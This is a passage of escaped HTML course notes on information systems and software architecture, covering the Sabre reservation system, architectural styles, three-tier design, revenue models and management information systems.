    &lt;a href=&#34;#problems-with-manual-reservations&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Difficult to match passenger names to seats&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Resulted in poorly managed inventory (i.e., seats on a fight)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Over-booking: dissatisfied customers&lt;/li&gt;
&lt;li&gt;Under-booking: lost revenue&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Aircraft with greater seating capacity and greater frequency of use on the horizon&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;More inventory and passengers to keep track of&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Introduction of Sabre:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Reduced man power&lt;/li&gt;
&lt;li&gt;American airlines - IBM&lt;/li&gt;
&lt;li&gt;Remote terminals&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;waves-of-innovation&#34; &gt;Waves of Innovation
&lt;span&gt;
    &lt;a href=&#34;#waves-of-innovation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;cut costs&lt;/li&gt;
&lt;li&gt;generate revenue&lt;/li&gt;
&lt;li&gt;business survival&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;software-architecture&#34; &gt;Software Architecture
&lt;span&gt;
    &lt;a href=&#34;#software-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;architecture (conceptual)
&lt;ul&gt;
&lt;li&gt;blueprint&lt;/li&gt;
&lt;li&gt;implementation independent&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;infrastructure (physical)
&lt;ul&gt;
&lt;li&gt;implementation dependent&lt;/li&gt;
&lt;li&gt;physical material&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;reference-architecture&#34; &gt;Reference Architecture
&lt;span&gt;
    &lt;a href=&#34;#reference-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;captures main components&lt;/li&gt;
&lt;li&gt;high level abstraction&lt;/li&gt;
&lt;li&gt;common vocabulary&lt;/li&gt;
&lt;li&gt;comparative&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;architectural-styles&#34; &gt;Architectural Styles
&lt;span&gt;
    &lt;a href=&#34;#architectural-styles&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;broad perspective on how to structure our
software application&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Component-based&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Layered&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Pipes and filters&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Microkernel&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Client/server&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Event-driven&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Repository&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;monolithic&#34; &gt;Monolithic
&lt;span&gt;
    &lt;a href=&#34;#monolithic&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;tightly coupled&lt;/li&gt;
&lt;li&gt;single large code base&lt;/li&gt;
&lt;li&gt;less scalable&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;service-oriented-architecture-soa&#34; &gt;Service-Oriented Architecture (SOA)
&lt;span&gt;
    &lt;a href=&#34;#service-oriented-architecture-soa&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;reusable and interoperable via service interfaces&lt;/li&gt;
&lt;li&gt;common interface standards&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;microservice-architecture&#34; &gt;Microservice Architecture
&lt;span&gt;
    &lt;a href=&#34;#microservice-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;single-function modules with well-defined interfaces and actions&lt;/li&gt;
&lt;li&gt;small teams own entire life cycle of the service&lt;/li&gt;
&lt;li&gt;The term “micro” refers to the sizing of a service which must be
#manageable by a single development team (5 to 10 developers).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;architecting-a-solution&#34; &gt;Architecting A Solution
&lt;span&gt;
    &lt;a href=&#34;#architecting-a-solution&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;three-tier&#34; &gt;Three Tier
&lt;span&gt;
    &lt;a href=&#34;#three-tier&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Presentation logic&lt;/li&gt;
&lt;li&gt;Application logic&lt;/li&gt;
&lt;li&gt;Data access logic &amp;amp; storage&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;zero-client&#34; &gt;Zero Client
&lt;span&gt;
    &lt;a href=&#34;#zero-client&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;No persistent storage, firmware loads OS into memory on power on.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cost-effective&lt;/li&gt;
&lt;li&gt;low power consumption&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;practice-3-a-weather-application&#34; &gt;Practice #3: A Weather Application
&lt;span&gt;
    &lt;a href=&#34;#practice-3-a-weather-application&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Many ways, most preferably the 3-tier system.&lt;/li&gt;
&lt;li&gt;Hybrid, weather data on server, peer - to - peer other&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-to-find-a-solution&#34; &gt;How to Find a Solution
&lt;span&gt;
    &lt;a href=&#34;#how-to-find-a-solution&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;First ask, what have you tried already and why didn&amp;rsquo;t it work?&lt;/p&gt;
&lt;h3 id=&#34;revenue-model&#34; &gt;Revenue Model
&lt;span&gt;
    &lt;a href=&#34;#revenue-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Common Revenue Models:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Direct Sales – This model involves selling products or services directly to customers.&lt;/li&gt;
&lt;li&gt;Advertising – Companies generate revenue by displaying advertisements to their customers.&lt;/li&gt;
&lt;li&gt;Subscription – Customers pay a recurring fee (monthly, yearly) to access and use a product or service.&lt;/li&gt;
&lt;li&gt;Freemium – This model offers a basic version of a product or service for free, but
charges for additional features or premium versions.&lt;/li&gt;
&lt;li&gt;Licensing or Royalties – Companies grant licenses to third parties to use their intellectual property (such as patents, trademarks, or copyrighted material) in exchange for royalties or licensing fees.&lt;/li&gt;
&lt;li&gt;Affiliate Marketing – Companies earn a commission by promoting and selling other companies&amp;rsquo; products or services through affiliate links or referral programs.&lt;/li&gt;
&lt;li&gt;Data Sales – Companies collect and analyze data from their customers and sell or license the insights or anonymized data to other businesses or researchers&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;revenue-model-and-design&#34; &gt;Revenue Model and Design
&lt;span&gt;
    &lt;a href=&#34;#revenue-model-and-design&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;advertising requires placement of ads in GUI&lt;/li&gt;
&lt;li&gt;subscriptions and subscriptions requires compelling premium features&lt;/li&gt;
&lt;li&gt;data sales requires a scheme to collect data&lt;/li&gt;
&lt;li&gt;rapid user acquisition requires scalability and iterations&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;triton-wear&#34; &gt;Triton Wear
&lt;span&gt;
    &lt;a href=&#34;#triton-wear&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;accelerometers and gyroscopes
&lt;ul&gt;
&lt;li&gt;stroke count, stroke rate, distance per stroke, and more&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;wearable device, mobile app, cloud infrastructure and analytics capability&lt;/li&gt;
&lt;li&gt;User Interface
&lt;ul&gt;
&lt;li&gt;Coach dashboard&lt;/li&gt;
&lt;li&gt;Athlete portal&lt;/li&gt;
&lt;li&gt;Integration and API for extending features&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;simply and seamless&lt;/li&gt;
&lt;li&gt;quick setup&lt;/li&gt;
&lt;li&gt;engaging&lt;/li&gt;
&lt;li&gt;lots of data&lt;/li&gt;
&lt;li&gt;accurate, consistent, reliable&lt;/li&gt;
&lt;li&gt;focusing on the skills rather than the timing to maximize performance&lt;/li&gt;
&lt;li&gt;automated data visualization progression&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;external-factors&#34; &gt;External Factors
&lt;span&gt;
    &lt;a href=&#34;#external-factors&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;internet&lt;/li&gt;
&lt;li&gt;global marketplace&lt;/li&gt;
&lt;li&gt;micro-markets&lt;/li&gt;
&lt;li&gt;business ecosystems&lt;/li&gt;
&lt;li&gt;decapitalization&lt;/li&gt;
&lt;li&gt;faster business cycles&lt;/li&gt;
&lt;li&gt;accountability and transparency&lt;/li&gt;
&lt;li&gt;rising risks of IT&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;internal-forces&#34; &gt;Internal Forces
&lt;span&gt;
    &lt;a href=&#34;#internal-forces&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;supply-push to demand-pull
&lt;ul&gt;
&lt;li&gt;respond to consumer demands and pull products&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;self-service
&lt;ul&gt;
&lt;li&gt;customers know what they want best&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;real-time working
&lt;ul&gt;
&lt;li&gt;responding fast to the customer demands&lt;/li&gt;
&lt;li&gt;optimized as possible&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;anytime, anyplace information work
&lt;ul&gt;
&lt;li&gt;remote / hybrid / mobile computing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Outsourcing and strategic alliances
&lt;ul&gt;
&lt;li&gt;Use of IT to help manage work across the extended enterprise&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Decease of hierarchy
&lt;ul&gt;
&lt;li&gt;Equal playing field with shared authority&lt;/li&gt;
&lt;li&gt;Use of IT to facilitate information exchange&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;strategies-in-the-new-work-environment&#34; &gt;Strategies in the New Work Environment
&lt;span&gt;
    &lt;a href=&#34;#strategies-in-the-new-work-environment&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;leverage knowledge globally&lt;/li&gt;
&lt;li&gt;organize for complexity&lt;/li&gt;
&lt;li&gt;work electronically&lt;/li&gt;
&lt;li&gt;handle continuous and discontinuous change&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;management-hierarchy&#34; &gt;Management Hierarchy
&lt;span&gt;
    &lt;a href=&#34;#management-hierarchy&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Senior
&lt;ul&gt;
&lt;li&gt;Executive Support Systems&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Middle Management
&lt;ul&gt;
&lt;li&gt;Management Information Systems (MIS)&lt;/li&gt;
&lt;li&gt;Decision Support Systems (DSS)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Operational Management
&lt;ul&gt;
&lt;li&gt;Transaction Processing Systems&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;information-workers&#34; &gt;Information Workers
&lt;span&gt;
    &lt;a href=&#34;#information-workers&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Procedure-based
&lt;ul&gt;
&lt;li&gt;Efficiency focused&lt;/li&gt;
&lt;li&gt;Easily measurable&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Knowledge-based
&lt;ul&gt;
&lt;li&gt;Effectiveness&lt;/li&gt;
&lt;li&gt;Harder to define&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;software-examples&#34; &gt;Software Examples
&lt;span&gt;
    &lt;a href=&#34;#software-examples&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Database Management System (DBMS)&lt;/li&gt;
